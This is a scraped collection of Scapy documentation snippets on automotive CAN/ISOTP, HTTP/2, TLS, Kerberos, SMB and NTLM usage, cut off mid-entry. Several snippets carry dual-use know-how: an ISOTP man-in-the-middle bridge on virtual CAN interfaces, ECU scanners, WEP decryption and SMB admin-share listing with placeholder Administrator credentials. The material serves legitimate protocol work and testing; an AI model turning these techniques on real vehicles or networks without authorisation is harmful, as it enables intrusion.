Python\nDESCRIPTION: Shows how to add a CAN header to an XCP message and send it using a CAN socket. Also demonstrates how to receive and interpret the response.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_15\n\nLANGUAGE: Python\nCODE:\n```\npkt = XCPOnCAN(identifier=0x700) / CTORequest() / Connect()\nsock = CANSocket(iface=can.interface.Bus(bustype='socketcan', channel='vcan0'))\nsock.send(pkt)\n\nsock = CANSocket(bustype='socketcan', channel='vcan0', basecls=XCPonCAN)\ndto = sock.sr1(pkt)\n```\n\n----------------------------------------\n\nTITLE: Implementing Variable Length Fields in Scapy\nDESCRIPTION: Examples of how to implement variable length fields in Scapy, including length fields and variable length fields.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\nFieldLenField(\"the_lenfield\", None, count_of=\"the_varfield\")\n\nFieldLenField(\"the_lenfield\", None, length_of=\"the_varfield\", adjust=lambda pkt,x:(x+1)/2)\n\nStrLenField(\"the_varfield\", \"the_default_value\", length_from = lambda pkt: pkt.the_lenfield)\n\nStrLenField(\"the_varfield\", \"the_default_value\", length_from = lambda pkt: pkt.the_lenfield-12)\n\nFieldListField(\"the_varfield\", [\"1.2.3.4\"], IPField(\"\", \"0.0.0.0\"), count_from = lambda pkt: pkt.the_lenfield)\n```\n\n----------------------------------------\n\nTITLE: HTTP Server with Basic Authentication\nDESCRIPTION: Shows how to create an HTTP server that uses basic authentication. This example configures the server to authenticate users with username and password credentials using the basic auth mechanism.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nserver = HTTP_Server.spawn(\n    port=8080,\n    iface=\"eth0\",\n    mech=HTTP_AUTH_MECHS.BASIC,\n    BASIC_IDENTITIES={\"user\": MD4le(\"password\")},\n)\n```\n\n----------------------------------------\n\nTITLE: Creating a Scapy PipeTool System\nDESCRIPTION: This example shows how to create a PipeTool system in Scapy, linking various Sources, Drains, and Sinks. It demonstrates the creation of a pipeline for data processing and visualization.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\ns = CLIFeeder()\ns2 = CLIHighFeeder()\nd1 = Drain()\nd2 = TransformDrain(lambda x: x[::-1])\nsi1 = ConsoleSink()\nsi2 = QueueSink()\n\ns > d1\nd1 > si1\nd1 > si2\n\ns2 >> d1\nd1 >> d2\nd2 >> si1\n\np = PipeEngine()\np.add(s)\np.add(s2)\np.graph(target=\"> the_above_image.png\")\n```\n\n----------------------------------------\n\nTITLE: Using XCPScanner from Command Line in Python\nDESCRIPTION: Provides an example of how to use the XCPScanner tool from the command line to find XCP-supporting ECUs on a CAN bus.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_18\n\nLANGUAGE: Python\nCODE:\n```\npython -m scapy.tools.automotive.xcpscanner -h\npython3.6 -m scapy.tools.automotive.xcpscanner can0\npython3.6 -m scapy.tools.automotive.xcpscanner can0 -b 500\npython3.6 -m scapy.tools.automotive.xcpscanner can0 -s 50 -e 100\npython3.6 -m scapy.tools.automotive.xcpscanner can0 -b 500 -v\n```\n\n----------------------------------------\n\nTITLE: Initializing NTLMSSP Client in Python\nDESCRIPTION: Creates an NTLMSSP client object with specified user credentials for authentication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/gssapi.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.ntlm import *\nclissp = NTLMSSP(\n    UPN=\"Administrator@domain.local\",\n    PASSWORD=\"Password1!\",\n)\n```\n\n----------------------------------------\n\nTITLE: SMB Client Programmatic Usage\nDESCRIPTION: Example of using SMB client programmatically to list shares and navigate directories without interactive mode.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> from scapy.layers.smbclient import smbclient\n>>> cli = smbclient(\"server1.domain.local\", \"Administrator@domain.local\", password=\"password\", cli=False)\n>>> shares = cli.shares()\n>>> shares\n[('ADMIN$', 'DISKTREE', 'Remote Admin'),\n('C$', 'DISKTREE', 'Default share'),\n('common', 'DISKTREE', ''),\n('IPC$', 'IPC', 'Remote IPC'),\n('NETLOGON', 'DISKTREE', 'Logon server share '),\n('SYSVOL', 'DISKTREE', 'Logon server share '),\n('Users', 'DISKTREE', '')]\n>>> cli.use('c$')\n>>> cli.cd(r'Program Files\\Microsoft')\n>>> names = [x[0] for x in cli.ls()]\n>>> names\n['.', '..', 'EdgeUpdater']\n```\n\n----------------------------------------\n\nTITLE: Configuring Monitor Mode on Windows\nDESCRIPTION: Code to enable monitor mode on a WiFi interface using Scapy's configuration settings on Windows systems.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/troubleshooting.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nconf.iface.setmonitor(True)\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using ISOTPNativeSocket in Python\nDESCRIPTION: Shows how to configure and use ISOTPNativeSocket on Linux systems with the can-isotp kernel module.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_22\n\nLANGUAGE: Python\nCODE:\n```\nconf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': True}\nload_contrib('isotp')\nsock = ISOTPSocket(\"can0\", tx_id=0x641, rx_id=0x241)\n```\n\n----------------------------------------\n\nTITLE: Dissecting Netflow V9 Packet in Python with Scapy\nDESCRIPTION: This snippet demonstrates how to dissect a Netflow V9 packet using Scapy. It first converts the packet to raw format to simulate receiving it, then uses the netflowv9_defragment function to reassemble and parse the Netflow data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/netflow.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\npkt = Ether(raw(pkt))  # will loose the defragmentation\npkt = netflowv9_defragment(pkt)[0]\n```\n\n----------------------------------------\n\nTITLE: OBD Request for Vehicle Identification Number in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to request the Vehicle Identification Number (VIN) using OBD service 09 with Scapy. It shows the request structure and how to interpret the response containing the VIN.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_37\n\nLANGUAGE: Python\nCODE:\n```\nreq = OBD()/OBD_S09(iid=0x02)\nresp = sock.sr1(req)\nresp.show()\n```\n\n----------------------------------------\n\nTITLE: Calculating UDP Checksum Manually with Scapy in Python\nDESCRIPTION: This code snippet demonstrates how to manually calculate a UDP checksum using Scapy functions and compare it with Scapy's automatic calculation. It involves creating a UDP packet, extracting the raw data, and using the in4_chksum function to compute the checksum.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/functions.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\n\n# Get the UDP checksum computed by Scapy\npacket = IP(dst=\"10.11.12.13\", src=\"10.11.12.14\")/UDP()/DNS()\npacket = IP(raw(packet))  # Build packet (automatically done when sending)\nchecksum_scapy = packet[UDP].chksum\n\n# Set the UDP checksum to 0 and compute the checksum 'manually'\npacket = IP(dst=\"10.11.12.13\", src=\"10.11.12.14\")/UDP(chksum=0)/DNS()\npacket_raw = raw(packet)\nudp_raw = packet_raw[20:]\n# in4_chksum is used to automatically build a pseudo-header\nchksum = in4_chksum(socket.IPPROTO_UDP, packet[IP], udp_raw)  # For more infos, call \"help(in4_chksum)\"\n\nassert(checksum_scapy == chksum)\n```\n\n----------------------------------------\n\nTITLE: Requesting a Kerberos TGT in Python using Scapy's Ticketer Module\nDESCRIPTION: This snippet demonstrates how to load the ticketer module, create a Ticketer instance, and request a Ticket Granting Ticket (TGT) for a user. It prompts for a password and displays the acquired ticket information.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.request_tgt(\"Administrator@DOMAIN.LOCAL\")\nEnter password: ************\n>>> t.show()\nTickets:\n0. Administrator@DOMAIN.LOCAL -> krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\nStart time         End time           Renew until        Auth time        \n31/08/23 11:38:34  31/08/23 21:38:34  31/08/23 21:38:35  31/08/23 01:38:34\n```\n\n----------------------------------------\n\nTITLE: Processing BLE Advertising Reports with Python\nDESCRIPTION: This snippet demonstrates how to rearrange BLE advertising reports into a generator, group them by MAC address, and count packets per device using Python's itertools and dictionary operations.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n# Rearrange into a generator that returns reports sequentially\nfrom itertools import chain\nreports = chain.from_iterable(\n  p[HCI_LE_Meta_Advertising_Reports].reports\n  for p in adverts)\n\n# Group reports by MAC address (consumes the reports generator)\ndevices = {}\nfor report in reports:\n  device = devices.setdefault(report.addr, [])\n  device.append(report)\n\n# Packet counters\ndevices_pkts = dict((k, len(v)) for k, v in devices.items())\nprint(devices_pkts)\n# {'xx:xx:xx:xx:xx:xx': 408, 'xx:xx:xx:xx:xx:xx': 2}\n```\n\n----------------------------------------\n\nTITLE: Scapy WEP Decryption Example\nDESCRIPTION: Example showing WEP decryption using cryptography library.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> enc=rdpcap(\"weplab-64bit-AA-managed.pcap\")\n>>> enc.show()\n>>> enc[0]\n>>> conf.wepkey=\"AA\\x00\\x00\\x00\"\n>>> dec=Dot11PacketList(enc).toEthernet()\n>>> dec.show()\n>>> dec[0]\n```\n\n----------------------------------------\n\nTITLE: Defining FlagsField Class Example - Python\nDESCRIPTION: Example demonstrating the usage of FlagsField class in Scapy for handling flag type fields in packet definitions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/development.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nclass FlagsTest(Packet):\n    fields_desc = [FlagsField(\"flags\", 0, 8, [\"f0\", \"f1\", \"f2\", \"f3\", \"f4\", \"f5\", \"f6\", \"f7\"])]\n>>> FlagsTest(flags=9).show2()\n###[ FlagsTest ]###\n  flags     = f0+f3\n>>> FlagsTest(flags=0).show2().strip()\n###[ FlagsTest ]###\n  flags     =\n```\n\n----------------------------------------\n\nTITLE: Processing HTTP/2 Frames and Handling Server Communication in Python\nDESCRIPTION: This code sends HTTP/2 header frames to a server (Google) and processes the response. It maintains window size accounting, handles ping frames by acknowledging them, and collects data frames into a sequence. The implementation includes error checking and timeout handling.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_46\n\nLANGUAGE: python\nCODE:\n```\nsrv_global_window -= len(str(hdrs_frm))\nassert(srv_global_window >= 0)\nss.send(hdrs_frm)\n\nh2seq = h2.H2Seq()\n\nnew_frame = None\nwhile isinstance(new_frame, type(None)) or 'ES' not in new_frame.flags:\n    # As previously, if we receive a ping, we ackownledge it.\n    if not isinstance(new_frame, type(None)) and new_frame.stream_id == 0:\n        if new_frame.type == h2.H2PingFrame.type_id:\n            new_frame.flags.add('A')\n            srv_global_window -= len(str(new_frame))\n            assert(srv_global_window >= 0)\n            ss.send(new_frame)\n            \n        assert new_frame.type != h2.H2ResetFrame.type_id \\\n            and new_frame.type != h2.H2GoAwayFrame.type_id, \\\n            \"Error received; something is not right!\"\n        \n    try:\n        new_frame = ss.recv()\n        new_frame.show()\n        if new_frame.stream_id == 5:\n            h2seq.frames.append(new_frame)\n    except:\n        import time\n        time.sleep(1)\n        new_frame = None\n```\n\n----------------------------------------\n\nTITLE: Parsing ClientHello Record\nDESCRIPTION: Reads and parses the ClientHello message from a raw TLS handshake capture\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nrecord1 = TLS(open('raw_data/tls_session_protected/01_cli.raw', 'rb').read())\nrecord1.show()\n```\n\n----------------------------------------\n\nTITLE: Using ISOTP Scanner from Command Line\nDESCRIPTION: This example shows how to use the ISOTPScanner tool from the command line to find ISOTP endpoints on a CAN bus.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_28\n\nLANGUAGE: bash\nCODE:\n```\npython -m scapy.tools.automotive.isotpscanner -h\npython3 -m scapy.tools.automotive.isotpscanner --channel can0 --start 0 --end 100\n```\n\n----------------------------------------\n\nTITLE: Implementing ISOTP MITM Attack with Bridge and Sniff in Python\nDESCRIPTION: This code demonstrates how to implement an ISOTP man-in-the-middle attack using bridge and sniff functions in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_27\n\nLANGUAGE: python\nCODE:\n```\nimport threading\nload_contrib('cansocket')\nconf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': True}\nload_contrib('isotp')\n\nisoTpSocketVCan0 = ISOTPSocket('vcan0', tx_id=0x241, rx_id=0x641)\nisoTpSocketVCan1 = ISOTPSocket('vcan1', tx_id=0x641, rx_id=0x241)\n\ndef sendPacketWithISOTPSocket():\n    sleep(0.2)\n    packet = ISOTP('Request')\n    isoTpSocketVCan0.send(packet)\n\ndef forwarding(pkt):\n    return pkt\n\ndef bridge():\n    bSocket0 = ISOTPSocket('vcan0', tx_id=0x641, rx_id=0x241)\n    bSocket1 = ISOTPSocket('vcan1', tx_id=0x241, rx_id=0x641)\n    bridge_and_sniff(if1=bSocket0, if2=bSocket1, xfrm12=forwarding, xfrm21=forwarding, timeout=1)\n    bSocket0.close()\n    bSocket1.close()\n\nthreadBridge = threading.Thread(target=bridge)\nthreadSender = threading.Thread(target=sendPacketWithISOTPSocket)\n\nthreadBridge.start()\nthreadSender.start()\n\nreceive = isoTpSocketVCan1.sniff(timeout=1)\n\nisoTpSocketVCan0.close()\nisoTpSocketVCan1.close()\n```\n\n----------------------------------------\n\nTITLE: Sending and Sniffing ISOTP Messages in Python\nDESCRIPTION: Demonstrates how to send ISOTP messages over an ISOTP socket and how to sniff for ISOTP messages.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_21\n\nLANGUAGE: Python\nCODE:\n```\nisoTpSocket = ISOTPSocket('vcan0', tx_id=0x241, rx_id=0x641)\nisoTpMessage = ISOTP('Message')\nisoTpSocket.send(isoTpMessage)\n\nisoTpSocket = ISOTPSocket('vcan0', tx_id=0x641, rx_id=0x241)\npackets = isoTpSocket.sniff(timeout=0.5)\n```\n\n----------------------------------------\n\nTITLE: Parsing HPack Encoded Headers in HTTP/2 Response using Scapy\nDESCRIPTION: This code snippet demonstrates the structure of HPack encoded headers in an HTTP/2 response. It includes multiple Literal Headers with Incremental Indexing, each containing compressed header strings, followed by an HTTP/2 Data Frame.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_16\n\nLANGUAGE: Python\nCODE:\n```\n      |   |  data      = 'HPackZString(Accept-Encoding)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 26\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 3\n      |   |  data      = 'HPackZString(gzip)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 31\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 9\n      |   |  data      = 'HPackZString(image/x-icon)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 33\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 22\n      |   |  data      = 'HPackZString(Thu, 08 Dec 2016 06:23:59 GMT)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 36\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 22\n      |   |  data      = 'HPackZString(Fri, 16 Dec 2016 06:23:59 GMT)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 44\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 22\n      |   |  data      = 'HPackZString(Thu, 08 Dec 2016 01:00:57 GMT)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 0\n      |  \\hdr_name  \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 16\n      |   |  data      = 'HPackZString(x-content-type-options)'\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 5\n      |   |  data      = 'HPackZString(nosniff)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 54\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 3\n      |   |  data      = 'HPackZString(sffe)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 28\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 3\n      |   |  data      = 'HPackZString(1494)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 0\n      |  \\hdr_name  \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 12\n      |   |  data      = 'HPackZString(x-xss-protection)'\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 10\n      |   |  data      = 'HPackZString(1; mode=block)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 24\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 16\n      |   |  data      = 'HPackZString(public, max-age=691200)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 21\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 5\n      |   |  data      = 'HPackZString(472252)'\n      |###[ HPack Literal Header With Incremental Indexing ]### \n      |  magic     = 1\n      |  index     = 0\n      |  \\hdr_name  \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 5\n      |   |  data      = 'HPackZString(alt-svc)'\n      |  \\hdr_value \\\n      |   |###[ HPack Header String ]### \n      |   |  type      = Compressed\n      |   |  len       = 28\n      |   |  data      = 'HPackZString(quic=\":443\"; ma=2592000; v=\"35,34\")'\n\n###[ HTTP/2 Frame ]### \n  len       = 0x5d6\n  type      = DataFrm\n  flags     = set(['End Stream (ES)'])\n  reserved  = 0L\n  stream_id = 3L\n###[ HTTP/2 Data Frame ]### \n\n```\n\n----------------------------------------\n\nTITLE: Low-Level SMB Socket Implementation\nDESCRIPTION: Demonstrates low-level SMB socket implementation with authentication and file listing functionality.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nimport socket\nfrom scapy.layers.smbclient import SMB_SOCKET\nfrom scapy.layers.spnego import SPNEGOSSP\nfrom scapy.layers.ntlm import NTLMSSP, MD4le\nfrom scapy.layers.kerberos import KerberosSSP\n\npassword = \"password\"\nssp = SPNEGOSSP([\n    NTLMSSP(UPN=\"Administrator\", PASSWORD=password),\n    KerberosSSP(\n        UPN=\"Administrator@domain.local\",\n        PASSWORD=password,\n        SPN=\"cifs/server1\",\n    )\n])\n\nsock = socket.socket()\nsock.connect((\"server1.domain.local\", 445))\nsmbsock = SMB_SOCKET.from_tcpsock(sock, ssp=ssp)\n\ntid = smbsock.tree_connect(\"C$\")\nsmbsock.set_TID(tid)\n\nfileid = smbsock.create_request('', type='folder')\nfiles = smbsock.query_directory(fileid)\nnames = [x[0] for x in files]\n\nsmbsock.close_request(fileid)\nsmbsock.close()\n```\n\n----------------------------------------\n\nTITLE: Binding CAN Layers and Sending Packets in Python\nDESCRIPTION: This code demonstrates how to bind layers for CAN communication, create a CANSocket, and send a packet. It shows the integration of SignalHeader with custom SignalPackets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nbind_layers(SignalHeader, muxTestFrame, identifier=0x123)\nbind_layers(SignalHeader, testFrameFloat, identifier=0x321)\n\ndbc_sock = CANSocket(\"can0\", basecls=SignalHeader)\n\npkt = SignalHeader()/testFrameFloat(floatSignal2=3.4)\n\ndbc_sock.send(pkt)\n```\n\n----------------------------------------\n\nTITLE: Analyzing ClientHello Extensions\nDESCRIPTION: Iterates through and displays all extensions in the ClientHello message\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfor extension in record1.msg[0].ext:\n    print('')\n    extension.show()\n```\n\n----------------------------------------\n\nTITLE: Defining Initial, Final, Stop, and Error States in Scapy Automaton\nDESCRIPTION: This snippet demonstrates how to define special states like initial, final, stop, and error states in a Scapy automaton using the ATMT.state decorator.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nclass Example(Automaton):\n    @ATMT.state(initial=1)\n    def BEGIN(self):\n        pass\n\n    @ATMT.state()\n    def SOME_STATE(self):\n        pass\n\n    @ATMT.state(final=1)\n    def END(self):\n        return \"Result of the automaton: 42\"\n\n    @ATMT.state(stop=1)\n    def STOP(self):\n        print(\"SHUTTING DOWN...\")\n        # e.g. close sockets...\n\n    @ATMT.condition(STOP)\n    def is_stopping(self):\n        raise self.END()\n\n    @ATMT.state(error=1)\n    def ERROR(self):\n        return \"Partial result, or explanation\"\n```\n\n----------------------------------------\n\nTITLE: Sending HTTP/2 Requests and Updating Window Size in Python\nDESCRIPTION: Creates an HTTP/2 sequence containing frames for both the frontpage and favicon requests. It then sends this sequence to the server and updates the global window size to manage flow control.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nh2seq = h2.H2Seq()\nh2seq.frames = [\n    qry_frontpage.frames[0],\n    real_qry_icon\n]\nsrv_global_window -= len(str(h2seq))\nassert(srv_global_window >= 0)\nss.send(h2seq)\n```\n\n----------------------------------------\n\nTITLE: Scapy Conversation Graph Example\nDESCRIPTION: Code showing how to generate conversation graphs from pcap files.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> p=rdpcap(\"myfile.pcap\")\n>>> p.conversations(type=\"jpg\", target=\"> test.jpg\")\n```\n\n----------------------------------------\n\nTITLE: Setting Up Virtual CAN Interfaces for ISOTP MITM Attack\nDESCRIPTION: This snippet shows how to set up two virtual CAN interfaces (vcan0 and vcan1) for an ISOTP man-in-the-middle attack scenario.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\nsudo modprobe vcan\nsudo ip link add name vcan0 type vcan\nsudo ip link add name vcan1 type vcan\nsudo ip link set dev vcan0 up\nsudo ip link set dev vcan1 up\n```\n\n----------------------------------------\n\nTITLE: Exporting Kerberos Tickets to ccache File in Scapy\nDESCRIPTION: This code shows how to export Kerberos tickets from Scapy's Ticketer module to a ccache file that can be used with standard Kerberos tools like klist. It requests a TGT and saves it to a file.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.request_tgt(\"Administrator@domain.local\", password=\"ScapyScapy1\")\n>>> t.save(\"/tmp/krb5cc_1000\")\n>>> exit()\n$ klist\nTicket cache: FILE:/tmp/krb5cc_1000\nDefault principal: Administrator@DOMAIN.LOCAL\n\nValid starting       Expires              Service principal\n08/31/2023 12:08:15  08/31/2023 23:08:15  krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\n        renew until 09/01/2023 12:08:12\n```\n\n----------------------------------------\n\nTITLE: Creating and Sending a SOME/IP SD Offer Service Message in Python using Scapy\nDESCRIPTION: This example shows how to create and send a SOME/IP SD offer service message with an IPv4 endpoint using Scapy. It includes creating UDP and IP packages, configuring the SD entry and option arrays, and sending the packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_34\n\nLANGUAGE: Python\nCODE:\n```\nload_contrib('automotive.someip')\n\nu = UDP(sport=30490, dport=30490)\ni = IP(src=\"192.168.0.13\", dst=\"224.224.224.245\")\nea = SDEntry_Service()\nea.type = 0x01\nea.srv_id = 0x1234\nea.inst_id = 0x5678\nea.major_ver = 0x00\nea.ttl = 3\noa = SDOption_IP4_EndPoint()\noa.addr = \"192.168.0.13\"\noa.l4_proto = 0x11\noa.port = 30509\nsd = SD()\nsd.set_entryArray(ea)\nsd.set_optionArray(oa)\np = i/u/sd\nsend(p)\n```\n\n----------------------------------------\n\nTITLE: Displaying HTTP/2 Headers Frame with Scapy\nDESCRIPTION: This code displays the complete HTTP/2 headers frame, including all header fields and their compression status, using Scapy's show2() method.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_44\n\nLANGUAGE: python\nCODE:\n```\nhdrs_frm.show2()\n```\n\n----------------------------------------\n\nTITLE: Listing Protocol Fields in Python\nDESCRIPTION: Demonstrates how to list all fields of a protocol (in this case, IP) using Scapy's ls() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nls(IP, verbose=True)\n```\n\n----------------------------------------\n\nTITLE: Decompressing and Displaying a GZipped Favicon Image in Python\nDESCRIPTION: Uses zlib to decompress a GZipped favicon image from HTTP/2 stream data and displays it in the Jupyter notebook by converting it to a base64-encoded HTML image.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_30\n\nLANGUAGE: python\nCODE:\n```\nimport zlib\nimg = zlib.decompress(stream_data[3][0].data, 16+zlib.MAX_WBITS)\nfrom IPython.core.display import HTML\nHTML('<img src=\"data:image/x-icon;base64,{}\" />'.format(img.encode('base64')))\n```\n\n----------------------------------------\n\nTITLE: Initializing NTLMSSP Server in Python\nDESCRIPTION: Creates an NTLMSSP server object with a dictionary of user identities and their corresponding hashed passwords for authentication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/gssapi.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.ntlm import *\nclissp = NTLMSSP(\n    IDENTITIES={\n        \"User1\": MD4le(\"Password1!\"),\n        \"User2\": MD4le(\"Password2!\"),\n    }\n)\n```\n\n----------------------------------------\n\nTITLE: Verifying ServerKeyExchange Signature\nDESCRIPTION: Assembles and verifies the signature in the ServerKeyExchange message\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook2_tls_protected.ipynb#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\ncli_random = pkcs_i2osp(record1.msg[0].gmt_unix_time, 4) + record1.msg[0].random_bytes\nsrv_random = pkcs_i2osp(record2.msg[0].gmt_unix_time, 4) + record2.msg[0].random_bytes\necdh_params = bytes(record4[TLSServerKeyExchange].params)\n\ncert_srv = record3.msg[0].certs[0][1]\ncert_srv.verify(cli_random + srv_random + ecdh_params, record4[TLSServerKeyExchange].sig.sig_val, h='sha512')\n```\n\n----------------------------------------\n\nTITLE: Creating and Manipulating ISOTP Messages in Python\nDESCRIPTION: Shows how to create ISOTP messages, including with extended addressing, and how to fragment them into CAN frames.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_20\n\nLANGUAGE: Python\nCODE:\n```\nload_contrib('isotp')\nISOTP(tx_id=0x241, rx_id=0x641, data=b\"\\x3eabc\")\n\nISOTP(tx_id=0x241, rx_id=0x641, rx_ext_address=0x41, data=b\"\\x3eabc\")\n\nISOTP(tx_id=0x241, rx_id=0x641, rx_ext_address=0x41, ext_address=0x41, data=b\"\\x3eabc\")\n\nISOTP(tx_id=0x241, rx_id=0x641, rx_ext_address=0x41, ext_address=0x55, data=b\"\\x3eabc\" * 10).fragment()\n```\n\n----------------------------------------\n\nTITLE: Defining Basic Field Types in Scapy\nDESCRIPTION: Examples of basic field types in Scapy, including byte, short, int, and long fields with various representations (hexadecimal, little-endian, signed).\nSOURCE: 